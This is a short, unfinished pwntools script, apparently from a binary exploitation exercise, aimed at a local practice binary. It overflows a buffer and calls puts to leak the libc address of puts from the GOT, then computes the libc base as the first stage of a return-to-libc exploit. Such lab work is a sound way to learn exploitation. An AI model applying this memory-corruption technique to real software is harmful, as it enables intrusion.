from pwn import *

target = process("./handson_5")

# address
puts_plt = 0x08048310
puts_got = 0x0804a010

#pop1ret = 

libc_puts_off = 0x000673d0

# payload 
payload = b"A" * 42
payload += p32(puts_plt)
payload += b"BBBB"
payload += p32(puts_got)

_ = target.readline()
target.sendline(payload)
_ = target.readline()

libc_puts_addr = u32(target.readline()[0:4])
print("libc_puts_addr : 0x{:x}\n".format(libc_puts_addr))

libc_base_addr = libc_puts_addr - libc_puts_off

print("libc_base_addr : 0x{:x}\n".format(libc_base_addr))

